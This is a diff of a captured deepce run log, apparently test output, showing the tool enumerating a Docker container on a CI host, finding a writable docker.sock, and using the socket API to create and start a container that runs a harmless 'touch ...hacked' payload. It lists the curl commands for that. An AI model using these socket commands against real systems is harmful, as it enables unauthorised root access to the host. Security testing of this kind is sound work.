@@ -31,40 +31,43 @@ ctrl+click links in modern terminal to open in a browser window
 See [4mhttps://stealthcopter.github.io/deepce[0m[0m
 
 [1;34m===================================[1;32m( Installing Packages )[1;34m====================================[0m
-fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
-fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz
-(1/29) Installing fstrm (0.6.1-r2)
-(2/29) Installing krb5-conf (1.0-r2)
-(3/29) Installing libcom_err (1.47.0-r2)
-(4/29) Installing keyutils-libs (1.6.3-r3)
-(5/29) Installing libverto (0.3.2-r2)
-(6/29) Installing krb5-libs (1.20.1-r1)
-(7/29) Installing nghttp2-libs (1.55.1-r0)
-(8/29) Installing protobuf-c (1.4.1-r2)
-(9/29) Installing libuv (1.44.2-r2)
-(10/29) Installing xz-libs (5.4.3-r0)
-(11/29) Installing libxml2 (2.11.4-r0)
-(12/29) Installing bind-libs (9.18.16-r0)
-(13/29) Installing bind-tools (9.18.16-r0)
-(14/29) Installing ca-certificates (20230506-r0)
-(15/29) Installing brotli-libs (1.0.9-r14)
-(16/29) Installing libunistring (1.1-r1)
-(17/29) Installing libidn2 (2.3.4-r1)
-(18/29) Installing libcurl (8.2.1-r0)
-(19/29) Installing curl (8.2.1-r0)
-(20/29) Installing libcap2 (2.69-r0)
-(21/29) Installing libcap-utils (2.69-r0)
-(22/29) Installing libcap (2.69-r0)
-(23/29) Installing libgcc (12.2.1_git20220924-r10)
-(24/29) Installing lua5.3-libs (5.3.6-r5)
-(25/29) Installing libpcap (1.10.4-r1)
-(26/29) Installing pcre (8.45-r3)
-(27/29) Installing libssh2 (1.10.0-r4)
-(28/29) Installing libstdc++ (12.2.1_git20220924-r10)
-(29/29) Installing nmap (7.93-r1)
-Executing busybox-1.36.1-r2.trigger
+fetch https://dl-cdn.alpinelinux.org/alpine/v3.19/main/x86_64/APKINDEX.tar.gz
+fetch https://dl-cdn.alpinelinux.org/alpine/v3.19/community/x86_64/APKINDEX.tar.gz
+(1/32) Installing fstrm (0.6.1-r4)
+(2/32) Installing krb5-conf (1.0-r2)
+(3/32) Installing libcom_err (1.47.0-r5)
+(4/32) Installing keyutils-libs (1.6.3-r3)
+(5/32) Installing libverto (0.3.2-r2)
+(6/32) Installing krb5-libs (1.21.2-r0)
+(7/32) Installing json-c (0.17-r0)
+(8/32) Installing nghttp2-libs (1.58.0-r0)
+(9/32) Installing protobuf-c (1.4.1-r7)
+(10/32) Installing libuv (1.47.0-r0)
+(11/32) Installing xz-libs (5.4.5-r0)
+(12/32) Installing libxml2 (2.11.6-r0)
+(13/32) Installing bind-libs (9.18.19-r1)
+(14/32) Installing bind-tools (9.18.19-r1)
+(15/32) Installing ca-certificates (20230506-r0)
+(16/32) Installing brotli-libs (1.1.0-r1)
+(17/32) Installing c-ares (1.22.1-r0)
+(18/32) Installing libunistring (1.1-r2)
+(19/32) Installing libidn2 (2.3.4-r4)
+(20/32) Installing libcurl (8.5.0-r0)
+(21/32) Installing curl (8.5.0-r0)
+(22/32) Installing libcap2 (2.69-r1)
+(23/32) Installing libcap-getcap (2.69-r1)
+(24/32) Installing libcap-setcap (2.69-r1)
+(25/32) Installing libcap-utils (2.69-r1)
+(26/32) Installing libcap (2.69-r1)
+(27/32) Installing libgcc (13.2.1_git20231014-r0)
+(28/32) Installing libpcap (1.10.4-r1)
+(29/32) Installing pcre (8.45-r3)
+(30/32) Installing libssh2 (1.11.0-r0)
+(31/32) Installing libstdc++ (13.2.1_git20231014-r0)
+(32/32) Installing nmap (7.94-r0)
+Executing busybox-1.36.1-r15.trigger
 Executing ca-certificates-20230506-r0.trigger
-OK: 39 MiB in 44 packages
+OK: 35 MiB in 47 packages
 [1;34m===================================[1;32m( Enumerating Platform )[1;34m===================================[0m
 [1;33m[+][1;32m Inside Container ........ [0m[1;33mYes[0m
 [1;33m[+][1;32m Container Platform ...... [0m[1;33mdocker[0m
@@ -73,7 +76,7 @@ OK: 39 MiB in 44 packages
 [1;33m[+][1;32m Groups .................. [0m[1;90m[1;37m[48;5;1mroot[0m[1;90m bin daemon sys adm disk [1;37m[48;5;1mwheel[0m[1;90m floppy dialout tape video[0m
 [1;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m
 [1;33m[+][1;32m Docker Sock ............. [0m[1;33mYes[0m
-[1;37msrw-rw----    1 root     ntp            0 Aug 16 13:39 /var/run/docker.sock[0m
+[1;37msrw-rw----    1 root     127            0 Dec 18 12:19 /var/run/docker.sock[0m
 [1;33m[+][1;32m Sock is writable ........ [0m[48;5;1mYes[0m
 [1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
 and obtain root privs on the host machine
@@ -83,28 +86,28 @@ See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m
 
 [1;90mcurl -s --unix-socket /var/run/docker.sock http://localhost/info[0m
 
-[1;37mKernelVersion:5.15.0-1042-azure
+[1;37mKernelVersion:6.2.0-1018-azure
 OperatingSystem:Ubuntu 22.04.3 LTS
 OSType:linux
 Architecture:x86_64
-NCPU:2
+NCPU:4
 DockerRootDir:/var/lib/docker
-Name:fv-az449-91
-ServerVersion:23.0.6+azure-2[0m
-[1;33m[+][1;32m Docker Version .......... [0m[1;33m23.0.6+azure-2[0m
+Name:fv-az1020-529
+ServerVersion:24.0.7[0m
+[1;33m[+][1;32m Docker Version .......... [0m[1;33m24.0.7[0m
 [1;33m[+][1;32m CVE–2019–13139 .......... [0m[1;90mNo[0m
 [1;33m[+][1;32m CVE–2019–5736 ........... [0m[1;90mNo[0m
 [1;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m
-[1;33m[+][1;32m Container ID ............ [0m[1;33ma19bc9e2346c[0m
+[1;33m[+][1;32m Container ID ............ [0m[1;33m2696e056602b[0m
 [1;33m[+][1;32m Container Full ID ....... [0m[1;33m/[0m
 [1;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m
 [1;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2[0m
 [1;33m[+][1;32m DNS Server(s) ........... [0m[1;33m168.63.129.16 [0m
 [1;33m[+][1;32m Host IP ................. [0m[1;33m172.17.0.1[0m
 [1;33m[+][1;32m Operating System ........ [0m[1;90mLinux[0m
-[1;33m[+][1;32m Kernel .................. [0m[1;90m5.15.0-1042-azure[0m
+[1;33m[+][1;32m Kernel .................. [0m[1;90m6.2.0-1018-azure[0m
 [1;33m[+][1;32m Arch .................... [0m[1;90mx86_64[0m
-[1;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz[0m
+[1;33m[+][1;32m CPU ..................... [0m[1;90mAMD EPYC 7763 64-Core Processor[0m
 [1;33m[+][1;32m Useful tools installed .. [0m[1;33mYes[0m
 [1;90m/usr/bin/curl
 /usr/bin/wget
@@ -120,7 +123,7 @@ Bounding set =cap_chown,cap_[1;37m[48;5;1mdac_override[0m[1;90m,cap_fowner,c
 Current IAB: !cap_[1;37m[48;5;1mdac_read_search[0m[1;90m,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,![1;37m[48;5;1mcap_sys_module[0m[1;90m,![1;37m[48;5;1mcap_sys_rawio[0m[1;90m,![1;37m[48;5;1mcap_sys_ptrace[0m[1;90m,!cap_sys_pacct,![1;37m[48;5;1mcap_sys_admin[0m[1;90m,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore[0m
 [1;33m[+][1;32m SSHD Service ............ [0m[1;90mNo[0m
 [1;33m[+][1;32m Privileged Mode ......... [0m[1;90mNo[0m
-[1;33m[+][1;32m Alpine Linux Version .... [0m[1;33m3.18.3[0m
+[1;33m[+][1;32m Alpine Linux Version .... [0m[1;33m3.19.0[0m
 [1;33m[+][1;32m └── CVE-2019-5021 ....... [0m[1;90mNo[0m
 [1;34m====================================[1;32m( Enumerating Mounts )[1;34m====================================[0m
 [1;33m[+][1;32m Docker sock mounted ....... [0m[48;5;1mYes[0m
@@ -134,12 +137,12 @@ See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m
 [1;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m
 [1;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m
 [1;90mHOME=/root
-HOSTNAME=a19bc9e2346c
+HOSTNAME=2696e056602b
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1[0m
 [1;33m[+][1;32m Any common entrypoint files ......... [0m[1;33mYes[0m
-[1;90m-rwxr-xr-x    1 1001     ntp        38.0K Aug 16 13:39 /root/deepce.sh[0m
+[1;90m-rwxr-xr-x    1 1001     127        38.0K Dec 18 12:22 /root/deepce.sh[0m
 [1;33m[+][1;32m Interesting files in root ........... [0m[1;90mNo[0m
 [1;33m[+][1;32m Passwords in common files ........... [0m[1;90mNo[0m
 [1;33m[+][1;32m Home directories .................... [0m[1;90mNo[0m
@@ -157,13 +160,13 @@ host machine, this can be used to enumerate further[0m
 [1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
 [1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m
 
-[1;33m[+][1;32m Creating container ..... [0m[1;33m119deca50d2f1df19fb9f26146806d0ae7bf217f8865a4e37a46b2f0e3d3ccd4[0m
+[1;33m[+][1;32m Creating container ..... [0m[1;33m9202e9a15119ffe74447fafa74f6f3431bc088c103d2cbe7d8d6733d3a01264a[0m
 [1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
-[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/119deca50d2f1df19fb9f26146806d0ae7bf217f8865a4e37a46b2f0e3d3ccd4/start[0m
-[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/119deca50d2f1df19fb9f26146806d0ae7bf217f8865a4e37a46b2f0e3d3ccd4/logs?stderr=1&stdout=1" --output -[0m
+[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/9202e9a15119ffe74447fafa74f6f3431bc088c103d2cbe7d8d6733d3a01264a/start[0m
+[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/9202e9a15119ffe74447fafa74f6f3431bc088c103d2cbe7d8d6733d3a01264a/logs?stderr=1&stdout=1" --output -[0m
 [1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
-[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/119deca50d2f1df19fb9f26146806d0ae7bf217f8865a4e37a46b2f0e3d3ccd4/stop[0m
-[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/119deca50d2f1df19fb9f26146806d0ae7bf217f8865a4e37a46b2f0e3d3ccd4[0m
+[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/9202e9a15119ffe74447fafa74f6f3431bc088c103d2cbe7d8d6733d3a01264a/stop[0m
+[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/9202e9a15119ffe74447fafa74f6f3431bc088c103d2cbe7d8d6733d3a01264a[0m
 [1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
 [1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
 [1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
